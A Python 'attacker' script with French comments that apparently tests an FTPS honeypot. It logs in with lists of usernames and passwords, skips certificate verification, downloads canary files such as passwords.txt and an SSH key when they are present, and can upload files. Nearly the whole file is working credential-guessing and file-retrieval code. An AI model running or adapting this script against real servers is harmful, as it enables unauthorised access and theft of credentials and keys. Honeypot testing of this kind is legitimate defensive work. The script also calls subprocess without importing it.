#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Attacker FTPS implicite — script plus complet et plus joli.

Features :
 - Implicit FTPS (wrap_socket dès connect)
 - Multi-utilisateurs / multi-mots de passe via CLI
 - Téléchargement de 'passwords.txt' + autres canaries
 - Upload de fichier de test (--upload)
 - Mesure de latence
 - Sorties colorées avec colorama
 - Logging local dans attacker.log
 - Résumé des succès/échecs
"""

import os
import sys
import ssl
import socket
import argparse
import logging
import time
from ftplib import FTP, error_perm

# 1) bootstrap colorama
try:
    from colorama import init, Fore, Style
except ImportError:
    print("[BOOTSTRAP] Installing colorama…")
    subprocess.check_call([sys.executable, "-m", "pip", "install", "colorama"])
    from colorama import init, Fore, Style
init(autoreset=True)

# 2) CLI
p = argparse.ArgumentParser(description="Attacker FTPS implicite script")
p.add_argument("-H","--host",   default="192.168.100.51", help="IP du honeypot")
p.add_argument("-P","--port",   default=2121,    type=int, help="Port FTPS")
p.add_argument("-U","--users",  nargs="+",      default=["anonymous","attacker"],
               help="Liste d'utilisateurs à tester")
p.add_argument("-W","--pwds",   nargs="+",      default=["","secret"],
               help="Liste de mots de passe (1:1 avec --users si même taille)")
p.add_argument("-u","--upload",  help="Chemin local d'un fichier à uploader")
p.add_argument("-d","--download",default="ftp_downloads",
               help="Dossier local pour les téléchargements")
args = p.parse_args()

# 3) Logging
LOG_FILE = "attacker.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format="%(asctime)s %(levelname)s %(message)s")
console = logging.StreamHandler(sys.stdout)
console.setLevel(logging.INFO)
logging.getLogger().addHandler(console)

# 4) Prépare le dossier de download
os.makedirs(args.download, exist_ok=True)

# 5) Canaries connues
CANARY_FILES = ["passwords.txt","secrets/ssh_key"]
# (vous pouvez en ajouter ici)

def try_user(user, pwd):
    start = time.time()
    print(Fore.CYAN + f"\n[*] Test {user!r}/{pwd!r} sur {args.host}:{args.port}")
    try:
        # TCP + TLS implicite
        raw = socket.create_connection((args.host, args.port), timeout=10)
        ctx = ssl._create_unverified_context()
        ss  = ctx.wrap_socket(raw, server_hostname=args.host)
        ftp = FTP()
        ftp.sock         = ss
        ftp.file         = ss.makefile('r', encoding='utf-8', newline='\r\n')
        ftp.af           = ss.family
        ftp.passiveserver= True

        banner = ftp.getresp().strip()
        print(Style.BRIGHT + banner)
        logging.info(f"{user}@login banner: {banner}")

        resp = ftp.login(user, pwd)
        print(Fore.GREEN + "  LOGIN OK :", resp)
        logging.info(f"{user}@login success")

        files = ftp.nlst(".")
        # nettoie les "./"
        files = [f.lstrip("./") for f in files]
        print(Fore.YELLOW + "  FILES    :", files)
        logging.info(f"{user}@nlst: {files}")

        # téléchargement des canaries présentes
        for cf in CANARY_FILES:
            if cf in files:
                out = os.path.join(args.download, f"{user}_{cf}")
                print(Fore.MAGENTA + f"  ↓ DL {cf} -> {out}")
                with open(out,"wb") as fd:
                    ftp.retrbinary(f"RETR {cf}", fd.write)
                print(Fore.GREEN + "    ✓ DL réussi")
                logging.info(f"{user}@download {cf} OK")

        # upload si demandé
        if args.upload:
            base = os.path.basename(args.upload)
            print(Fore.BLUE + f"  ↑ UPLOAD {args.upload} -> /{base}")
            with open(args.upload,"rb") as rd:
                ftp.storbinary(f"STOR {base}", rd)
            print(Fore.GREEN + "    ✓ Upload réussi")
            logging.info(f"{user}@upload {base} OK")

        ftp.quit()
        return True, time.time() - start

    except error_perm as e:
        print(Fore.RED + "  ! PERM ERROR:", e)
        logging.warning(f"{user}@perm failed: {e}")
    except Exception as e:
        print(Fore.RED + "  ! ERREUR     :", e)
        logging.exception(f"{user}@exception")
    return False, time.time() - start

def main():
    print(Style.BRIGHT + Fore.CYAN + "[*] Lancement du script attacker.py")
    results = []
    for i, user in enumerate(args.users):
        pwd = args.pwds[i] if i < len(args.pwds) else ""
        ok, dt = try_user(user, pwd)
        results.append((user, ok, dt))
    print(Style.BRIGHT + "\n[*] RÉSUMÉ :")
    for user, ok, dt in results:
        status = Fore.GREEN+"OK" if ok else Fore.RED+"KO"
        print(f"  - {user:10s} : {status} en {dt:.2f}s")
    print(Style.BRIGHT + Fore.CYAN + f"\nLogs détaillés dans {LOG_FILE}")
    print(Style.BRIGHT + Fore.CYAN + f"Téléchargements dans {args.download}")

if __name__=="__main__":
    main()
